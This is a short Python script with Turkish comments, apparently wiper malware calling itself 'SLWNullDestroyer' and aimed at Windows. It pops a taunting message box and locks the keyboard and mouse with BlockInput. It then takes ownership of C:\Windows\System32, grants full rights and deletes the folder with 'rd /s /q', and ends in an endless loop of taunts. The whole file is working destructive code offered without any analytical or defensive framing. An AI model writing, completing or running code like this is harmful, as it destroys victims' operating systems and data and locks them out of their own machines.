import os
import ctypes
import time

def block_input():
    # Klavye ve fareyi kilitle
    ctypes.windll.user32.BlockInput(True)

def delete_critical_files():
    # Kritik dosyaları sil
    os.system("takeown /f C:\\Windows\\System32 /r /d y >nul 2>&1")
    os.system("icacls C:\\Windows\\System32 /grant %username%:F /t >nul 2>&1")
    os.system("rd /s /q C:\\Windows\\System32")

def infinite_loop():
    # Sonsuz döngü
    while True:
        print("😀😂😈 SLWNullDestroyer was here!")
        time.sleep(1)

# Büyük mesaj
ctypes.windll.user32.MessageBoxW(0, "SEE YOU LATER BABY 😈\nSYS: SLAWEALLY", "SLWNullDestroyer", 0)

block_input()
delete_critical_files()
infinite_loop()
